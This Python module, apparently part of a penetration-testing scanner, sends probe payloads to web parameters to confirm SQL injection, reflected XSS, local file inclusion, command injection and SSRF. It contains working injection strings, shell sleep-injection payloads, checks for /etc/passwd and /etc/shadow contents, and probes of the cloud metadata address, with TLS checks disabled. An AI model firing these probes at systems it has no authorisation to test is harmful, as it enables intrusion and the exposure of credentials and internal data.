#!/usr/bin/env python3
"""
漏洞验证模块 - 自动验证漏洞真实性
支持: SQLi, XSS, LFI, RCE, SSRF等漏洞的自动化验证
"""

import re
import time
import hashlib
import urllib.parse
import urllib.request
import urllib.error
import ssl
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime


@dataclass
class VerificationResult:
    """验证结果"""
    vuln_type: str
    payload: str
    url: str
    is_vulnerable: bool
    confidence: str  # high, medium, low, false_positive
    evidence: str
    response_time: float
    response_code: int
    response_length: int
    verification_method: str
    recommendation: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


class VulnerabilityVerifier:
    """漏洞验证器"""
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.ssl_ctx = ssl.create_default_context()
        self.ssl_ctx.check_hostname = False
        self.ssl_ctx.verify_mode = ssl.CERT_NONE
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    def _request(self, url: str, method: str = "GET", data: str = None,
                 headers: Dict = None) -> Tuple[Optional[str], int, float, int]:
        """发送HTTP请求"""
        start = time.time()
        
        try:
            req = urllib.request.Request(url, method=method)
            req.add_header('User-Agent', self.user_agent)
            
            if headers:
                for k, v in headers.items():
                    req.add_header(k, v)
            
            if data:
                req.data = data.encode()
            
            resp = urllib.request.urlopen(req, timeout=self.timeout, context=self.ssl_ctx)
            body = resp.read().decode('utf-8', errors='ignore')
            elapsed = time.time() - start
            
            return body, resp.status, elapsed, len(body)
            
        except urllib.error.HTTPError as e:
            elapsed = time.time() - start
            try:
                body = e.read().decode('utf-8', errors='ignore')
            except:
                body = ""
            return body, e.code, elapsed, len(body)
        except Exception:
            return None, 0, time.time() - start, 0
    
    def verify_sqli_time_based(self, url: str, param: str, delay: int = 5) -> VerificationResult:
        """时间盲注验证"""
        # 基准请求
        base_url = url
        _, _, base_time, _ = self._request(base_url)
        
        # Sleep payload
        payloads = [
            f"' AND SLEEP({delay})--",
            f"' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
            f"'; WAITFOR DELAY '0:0:{delay}'--",
            f"' AND pg_sleep({delay})--",
        ]
        
        for payload in payloads:
            test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}")
            _, code, elapsed, length = self._request(test_url)
            
            # 如果响应时间显著增加
            if elapsed >= delay - 0.5:
                return VerificationResult(
                    vuln_type="SQL Injection (Time-based Blind)",
                    payload=payload,
                    url=test_url,
                    is_vulnerable=True,
                    confidence="high",
                    evidence=f"Response delayed {elapsed:.2f}s (expected {delay}s)",
                    response_time=elapsed,
                    response_code=code,
                    response_length=length,
                    verification_method="time_delay",
                    recommendation="立即修复! 使用参数化查询替代字符串拼接"
                )
        
        return VerificationResult(
            vuln_type="SQL Injection",
            payload="N/A",
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="No time delay detected",
            response_time=base_time,
            response_code=200,
            response_length=0,
            verification_method="time_delay"
        )
    
    def verify_sqli_boolean(self, url: str, param: str) -> VerificationResult:
        """布尔盲注验证"""
        # True条件
        true_payloads = ["' AND '1'='1", "' AND 1=1--", "') AND ('1'='1"]
        # False条件
        false_payloads = ["' AND '1'='2", "' AND 1=2--", "') AND ('1'='2"]
        
        for true_p, false_p in zip(true_payloads, false_payloads):
            true_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(true_p)}")
            false_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(false_p)}")
            
            true_body, true_code, _, true_len = self._request(true_url)
            false_body, false_code, _, false_len = self._request(false_url)
            
            if true_body and false_body:
                # 检查响应差异
                len_diff = abs(true_len - false_len)
                code_diff = true_code != false_code
                
                # 内容差异检测
                content_diff = len([i for i in range(min(len(true_body), len(false_body))) 
                                   if true_body[i] != false_body[i]]) > 50
                
                if len_diff > 100 or code_diff or content_diff:
                    return VerificationResult(
                        vuln_type="SQL Injection (Boolean-based Blind)",
                        payload=f"True: {true_p} | False: {false_p}",
                        url=url,
                        is_vulnerable=True,
                        confidence="medium",
                        evidence=f"Response diff: len={len_diff}, code={true_code}vs{false_code}",
                        response_time=0,
                        response_code=true_code,
                        response_length=true_len,
                        verification_method="boolean_diff",
                        recommendation="使用参数化查询, 实施输入验证"
                    )
        
        return VerificationResult(
            vuln_type="SQL Injection",
            payload="N/A",
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="No boolean difference detected",
            response_time=0,
            response_code=200,
            response_length=0,
            verification_method="boolean_diff"
        )
    
    def verify_sqli_error(self, url: str, param: str) -> VerificationResult:
        """报错注入验证"""
        error_patterns = [
            r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
            r"PostgreSQL.*ERROR", r"pg_query\(\)", r"pg_exec\(\)",
            r"ORA-[0-9]{5}", r"Oracle.*Driver", r"SQLServer.*Driver",
            r"ODBC.*Driver", r"SQLite.*error", r"sqlite3\.OperationalError",
            r"Unclosed quotation mark", r"quoted string not properly terminated",
        ]
        
        payloads = ["'", "\"", "' OR '", "'; --", "1'1", "1 AND 1=1"]
        
        for payload in payloads:
            test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}")
            body, code, elapsed, length = self._request(test_url)
            
            if body:
                for pattern in error_patterns:
                    match = re.search(pattern, body, re.IGNORECASE)
                    if match:
                        return VerificationResult(
                            vuln_type="SQL Injection (Error-based)",
                            payload=payload,
                            url=test_url,
                            is_vulnerable=True,
                            confidence="high",
                            evidence=f"SQL error found: {match.group()[:100]}",
                            response_time=elapsed,
                            response_code=code,
                            response_length=length,
                            verification_method="error_pattern",
                            recommendation="禁用详细错误信息, 使用参数化查询"
                        )
        
        return VerificationResult(
            vuln_type="SQL Injection",
            payload="N/A",
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="No SQL error patterns found",
            response_time=0,
            response_code=200,
            response_length=0,
            verification_method="error_pattern"
        )
    
    def verify_xss_reflected(self, url: str, param: str, payload: str) -> VerificationResult:
        """反射型XSS验证"""
        # 生成唯一标记
        marker = f"xss{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
        
        # 替换payload中的标记
        test_payload = payload.replace("XSS", marker).replace("alert(1)", f"alert('{marker}')")
        test_payload = test_payload.replace("'XSS'", f"'{marker}'")
        
        test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(test_payload)}")
        body, code, elapsed, length = self._request(test_url)
        
        if body:
            # 检查是否反射
            raw_reflected = marker in body
            encoded_reflected = urllib.parse.quote(marker) in body
            html_encoded = f"&#{ord(marker[0])};" in body
            
            # 检查是否在危险上下文中
            dangerous_contexts = [
                f"<script>{marker}", f"<script>alert('{marker}')",
                f"onerror={marker}", f"onclick={marker}",
                f"<img src=x onerror=alert('{marker}')",
            ]
            
            in_dangerous_context = any(ctx in body for ctx in dangerous_contexts)
            
            if raw_reflected and not encoded_reflected:
                return VerificationResult(
                    vuln_type="Cross-Site Scripting (Reflected XSS)",
                    payload=test_payload,
                    url=test_url,
                    is_vulnerable=True,
                    confidence="high" if in_dangerous_context else "medium",
                    evidence=f"Payload reflected without encoding. Dangerous context: {in_dangerous_context}",
                    response_time=elapsed,
                    response_code=code,
                    response_length=length,
                    verification_method="reflection_check",
                    recommendation="实施输出编码, 使用CSP头"
                )
            elif encoded_reflected:
                return VerificationResult(
                    vuln_type="XSS (Potentially Safe)",
                    payload=test_payload,
                    url=test_url,
                    is_vulnerable=False,
                    confidence="high",
                    evidence="Payload is properly encoded",
                    response_time=elapsed,
                    response_code=code,
                    response_length=length,
                    verification_method="reflection_check"
                )
        
        return VerificationResult(
            vuln_type="XSS",
            payload=test_payload,
            url=test_url,
            is_vulnerable=False,
            confidence="low",
            evidence="Payload not reflected",
            response_time=elapsed if body else 0,
            response_code=code,
            response_length=length,
            verification_method="reflection_check"
        )
    
    def verify_lfi(self, url: str, param: str, payload: str) -> VerificationResult:
        """LFI漏洞验证"""
        test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}")
        body, code, elapsed, length = self._request(test_url)
        
        if body:
            # Linux文件特征
            linux_indicators = {
                "/etc/passwd": ["root:", "bin:", "daemon:", "nobody:", "/bin/bash", "/bin/sh"],
                "/etc/shadow": ["root:", "$6$", "$5$", "$1$"],
                "/proc/version": ["Linux version", "gcc version"],
            }
            
            # Windows文件特征
            windows_indicators = {
                "win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
                "hosts": ["localhost", "127.0.0.1"],
                "boot.ini": ["[boot loader]", "[operating systems]"],
            }
            
            found_evidence = []
            
            # 检查Linux
            for file_path, markers in linux_indicators.items():
                if file_path in payload:
                    for marker in markers:
                        if marker in body:
                            found_evidence.append(f"Found '{marker}' from {file_path}")
            
            # 检查Windows
            for file_path, markers in windows_indicators.items():
                if file_path in payload:
                    for marker in markers:
                        if marker in body:
                            found_evidence.append(f"Found '{marker}' from {file_path}")
            
            if found_evidence:
                return VerificationResult(
                    vuln_type="Local File Inclusion (LFI)",
                    payload=payload,
                    url=test_url,
                    is_vulnerable=True,
                    confidence="high",
                    evidence="; ".join(found_evidence[:3]),
                    response_time=elapsed,
                    response_code=code,
                    response_length=length,
                    verification_method="content_check",
                    recommendation="使用白名单验证文件路径, 禁止目录穿越"
                )
        
        return VerificationResult(
            vuln_type="LFI",
            payload=payload,
            url=test_url,
            is_vulnerable=False,
            confidence="low",
            evidence="No sensitive file content found",
            response_time=elapsed if body else 0,
            response_code=code,
            response_length=length,
            verification_method="content_check"
        )
    
    def verify_rce_time_based(self, url: str, param: str, delay: int = 5) -> VerificationResult:
        """RCE时间验证"""
        payloads = [
            f"; sleep {delay}",
            f"| sleep {delay}",
            f"|| sleep {delay}",
            f"& sleep {delay} &",
            f"`sleep {delay}`",
            f"$(sleep {delay})",
            f"; ping -c {delay} 127.0.0.1",
        ]
        
        # 基准时间
        _, _, base_time, _ = self._request(url)
        
        for payload in payloads:
            test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}")
            _, code, elapsed, length = self._request(test_url)
            
            if elapsed >= delay - 0.5:
                return VerificationResult(
                    vuln_type="Remote Code Execution (RCE)",
                    payload=payload,
                    url=test_url,
                    is_vulnerable=True,
                    confidence="high",
                    evidence=f"Command execution confirmed. Delay: {elapsed:.2f}s",
                    response_time=elapsed,
                    response_code=code,
                    response_length=length,
                    verification_method="time_delay",
                    recommendation="严重漏洞! 立即修复, 使用白名单命令执行"
                )
        
        return VerificationResult(
            vuln_type="RCE",
            payload="N/A",
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="No command execution detected",
            response_time=base_time,
            response_code=200,
            response_length=0,
            verification_method="time_delay"
        )
    
    def verify_ssrf(self, url: str, param: str, callback_url: str = None) -> VerificationResult:
        """SSRF验证"""
        # 内部地址探测
        internal_targets = [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",  # AWS
        ]
        
        for target in internal_targets:
            test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(target)}")
            body, code, elapsed, length = self._request(test_url)
            
            if body:
                # 检查是否获取到内部信息
                indicators = [
                    "ami-id", "instance-id",  # AWS metadata
                    "localhost", "127.0.0.1",
                    "root:", "daemon:",  # /etc/passwd
                ]
                
                for indicator in indicators:
                    if indicator in body:
                        return VerificationResult(
                            vuln_type="Server-Side Request Forgery (SSRF)",
                            payload=target,
                            url=test_url,
                            is_vulnerable=True,
                            confidence="high",
                            evidence=f"Internal resource accessed. Found: {indicator}",
                            response_time=elapsed,
                            response_code=code,
                            response_length=length,
                            verification_method="internal_access",
                            recommendation="限制出站请求, 使用URL白名单"
                        )
        
        return VerificationResult(
            vuln_type="SSRF",
            payload="N/A",
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="No SSRF indicators found",
            response_time=0,
            response_code=200,
            response_length=0,
            verification_method="internal_access"
        )
    
    def batch_verify(self, findings: List[Dict]) -> List[VerificationResult]:
        """批量验证漏洞"""
        results = []
        
        for finding in findings:
            url = finding.get("url", "")
            param = finding.get("param", "")
            vuln_type = finding.get("type", "").lower()
            payload = finding.get("payload", "")
            
            if "sqli" in vuln_type or "sql" in vuln_type:
                result = self.verify_sqli_error(url, param)
                if not result.is_vulnerable:
                    result = self.verify_sqli_boolean(url, param)
                if not result.is_vulnerable:
                    result = self.verify_sqli_time_based(url, param)
            
            elif "xss" in vuln_type:
                result = self.verify_xss_reflected(url, param, payload)
            
            elif "lfi" in vuln_type or "file" in vuln_type:
                result = self.verify_lfi(url, param, payload)
            
            elif "rce" in vuln_type or "command" in vuln_type:
                result = self.verify_rce_time_based(url, param)
            
            elif "ssrf" in vuln_type:
                result = self.verify_ssrf(url, param)
            
            else:
                continue
            
            results.append(result)
        
        return results
